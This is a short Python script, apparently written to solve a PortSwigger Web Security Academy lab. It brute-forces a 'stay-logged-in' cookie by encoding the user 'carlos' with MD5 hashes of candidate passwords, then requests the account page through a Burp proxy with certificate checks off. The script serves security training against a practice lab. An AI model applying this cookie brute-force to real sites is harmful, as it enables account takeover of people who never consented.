import hashlib
import base64
import requests

'''
A simple script written to solve "Lab: Brute-forcing a stay-logged-in cookie" - Portswigger Web Security Academy.
Remember to replace part of the link with your lab ID in all requests
Written by Julia Zduńczyk
'''


# I set it up so that all requests go through the burp - to conveniently view them
# You can skip this step
proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
session = requests.session()
session.proxies.update(proxies)

# First, I'll prepare a list of possible cookies - they consist of a username and a possible password md5 hash, all encoded as base64
cookies = []
with open ('passwords.txt', 'r') as f:
    for line in f:
        cookies.append(line.rstrip())

for i, password in enumerate(cookies):
    result = hashlib.md5(password.encode())
    plain_cookie = 'carlos:' + result.hexdigest()
    plain_cookie_bytes = plain_cookie.encode('ascii')
    base64_bytes = base64.b64encode(plain_cookie_bytes)
    cookies[i] = base64_bytes.decode('ascii')

#print(cookies)

for cookie in cookies:
    
    cookies = {'stay-logged-in': cookie}

    # response = session.get('<your-lab-ID>.net/login', cookies=cookies, verify=False)
    response = session.get('https://<your-lab-ID>.web-security-academy.net/my-account', cookies=cookies, verify=False)


